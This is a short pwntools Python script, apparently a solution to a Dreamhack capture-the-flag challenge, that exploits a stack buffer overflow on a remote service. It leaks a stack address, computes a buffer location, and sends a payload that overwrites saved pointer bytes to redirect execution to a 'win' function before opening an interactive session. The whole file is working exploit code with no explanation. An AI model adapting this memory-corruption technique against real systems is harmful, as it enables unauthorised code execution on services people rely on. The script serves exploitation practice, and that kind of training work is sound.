from pwn import *

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 8851
r = remote(HOST, PORT)

r.sendlineafter(b': ', b'A'*0x12f)
r.recvline()
stack_leak = u64(r.recvuntil(b'm').strip(b'm').ljust(8, b'\x00'))
buf = stack_leak-0x330
a = str(hex(buf))[-2:]
b = str(hex(buf))[-4:-2]
win=0x40135b
payload = int.to_bytes(int(a,16)) + int.to_bytes(int(b,16))
payload = b'A'*8+p64(win)+b'A'*(0x130-16)+payload
r.sendafter(b': ', payload)

r.interactive()